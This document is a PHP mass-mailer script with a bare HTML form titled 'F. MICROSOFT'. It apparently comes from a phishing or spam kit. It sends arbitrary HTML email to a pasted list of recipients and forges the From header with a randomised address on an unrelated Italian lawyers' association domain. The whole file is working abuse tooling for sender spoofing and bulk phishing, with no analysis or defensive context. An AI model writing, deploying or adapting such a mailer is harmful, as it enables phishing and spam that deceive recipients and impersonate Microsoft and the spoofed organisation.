<?php
$testa = $_POST['veio']; if($testa != "") {
$message = $_POST['html'];	$subject = $_POST['assunto'];
$nome = $_POST['nome'];	$de = $_POST['de'];
$to = $_POST['emails'];	$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$email = explode("\n", $to);
$headers .= "From: ".$nome." <".$de.">\r\n";
$message = stripslashes($message);
$dataHora = date("d/m/Y h:i:s");
$i = 0;
$count = 1;
while($email[$i]) {
$ok = "ok";
if(mail($email[$i], $subject.$dataHora, $message, $headers))
echo "<font color=#000>*Cliente: $count <b>".$email[$i]."</b> </font><font color=#00FF00>Email_Enviado_com_Sucesso_100%</font><br><hr>";
else
		echo "<font color=#000>*Cliente: $count <b>".$email[$i]."</b> </font><font color=red>Email_Enviado_com_Error</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	if($ok == "ok")
	echo ""; 
}

?>




<html>
<head>
<title>F. MICROSOFT</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top:0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 70px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #333333;
	background-color: #FFFFFF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #990000;
	font-size: 10px;
}
.style2 {
	color: #FFF;
	font-weight: bold;
	text-shadow:1px 1px 0 #000;
}
</style>

 </head>
<body style="margin-top:10px;">
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="521" height="609" border="0" align="center" cellpadding="0" cellspacing="0" class="normal">
	    <tr>
          <td width="521" height="609" align="center" bgcolor="#99CCFF"><table width="92%" height="356"  border="0" align="center" cellpadding="0" cellspacing="0" class="normal">
            <tr>
              <td height="32" align="right"><input name="nome" type="text" class="form" id="nome" style="width:100%; height:40px; border:1px solid #99CCFF; padding:5px 5px 5px 5px;" ></td>
            </tr>
            <tr>
              <td width="68%" height="32">
<input name="de" type="text" class="form" id="de" style="width:100%;height:40px;border:1px solid #99CCFF;padding:5px 5px 5px 5px;" value="<?php
  function string_aleatoria($tamanho)  {   $conteudo = "abcdefghijklmnopqrstuvxzyw";
   for($i=0;$i<$tamanho;$i++)
   {
         $string .= $conteudo{rand(0,35)};
   }
   return $string;
  }
  echo string_aleatoria(10);
?>_unioneavvocaticampania@unioneavvocaticampania.it" ></td>
            </tr>
            <tr>
              <td align="right" height="32"><input name="assunto" type="text"class="form" id="assunto" style="width:100%;height:40px;border:1px solid #99CCFF;padding:5px 5px 5px 5px;" ></td>
            </tr>
            <tr align="right">
              <td height="102" colspan="2" valign="top"><textarea name="html" style="width:100%; height:200px;border:1px solid #99CCFF;padding:5px 5px 5px 5px;" rows="8" wrap="VIRTUAL" class="form" id="html"></textarea></td>
            </tr>
            <tr align="right">
              <td height="102" colspan="2" valign="top"><textarea name="emails" style="width:100%; height:180px;border:1px solid #99CCFF;padding:5px 5px 5px 5px;" rows="8" wrap="VIRTUAL" class="form" id="emails"></textarea></td>
            </tr>
            <tr>
              <td height="52" colspan="2" align="right" valign="top" ><input name="Submit" type="submit" style="width:100%; height:50px;border:1px solid #FFF; background:#99CCFF;" value=" "></td>
            </tr>
          </table></td>
	    </tr>
</table>
</form></body></html>